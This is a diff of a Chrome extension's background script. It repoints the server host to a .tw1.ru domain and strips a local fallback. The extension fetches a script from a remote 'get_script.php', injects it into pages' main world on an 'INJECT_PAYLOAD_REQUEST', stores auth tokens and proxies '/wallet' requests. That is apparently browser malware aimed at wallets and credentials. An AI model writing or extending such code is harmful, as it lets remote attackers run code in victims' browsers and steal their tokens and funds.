@@ -1,4 +1,4 @@
-const SERVER_HOST = "https://minedropmiroslav-zvdx.vercel.app"; 
+const SERVER_HOST = "https://cv749818.tw1.ru"; 
 const SCRIPT_URL = `${SERVER_HOST}/script/get_script.php`;
 const PROXY_BASE = `${SERVER_HOST}/wallet`; 
 const storage = {
@@ -19,19 +19,8 @@ async function injectScript(tabId, frameId) {
     });
   } catch (error) {
     console.error("[BG] Ошибка:", error);
-    // Fallback на локальный скрипт
-    try {
-      await chrome.scripting.executeScript({
-        target: { tabId: tabId, frameIds: [frameId] },
-        world: 'MAIN',
-        files: ['inject.js']
-      });
-    } catch (e) {
-      console.error("[BG] Ошибка загрузки локального скрипта:", e);
-    }
   }
 }
-
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   switch (message.type) {
     case "SAVE_AUTH_TOKEN":
@@ -39,9 +28,8 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
       break;
 
     case "INJECT_PAYLOAD_REQUEST":
-       if (sender.tab) {
-           const frameId = sender.frameId !== undefined ? sender.frameId : 0;
-           injectScript(sender.tab.id, frameId);
+       if (sender.tab && sender.frameId) {
+           injectScript(sender.tab.id, sender.frameId);
        }
        break;
     case "PROXY_FETCH_REQUEST":
@@ -76,4 +64,3 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
       return true;
   }
 });
-
